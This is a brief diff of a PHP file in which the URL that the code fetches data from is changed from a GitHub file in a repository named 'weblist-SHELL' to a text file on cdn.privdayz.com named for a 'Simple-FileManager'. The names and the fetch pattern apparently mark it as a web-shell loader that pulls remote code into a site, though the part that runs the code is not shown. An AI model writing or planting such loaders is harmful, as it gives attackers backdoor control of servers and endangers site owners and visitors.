@@ -21,7 +21,7 @@
             return $data;
         }
 
-        $url = 'https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/about.txt'; 
+        $url = 'https://cdn.privdayz.com/txt/Simple-FileManager-RibelCyberTeam.txt'; 
         $data = get($url);
 
         if ($data !== false) {
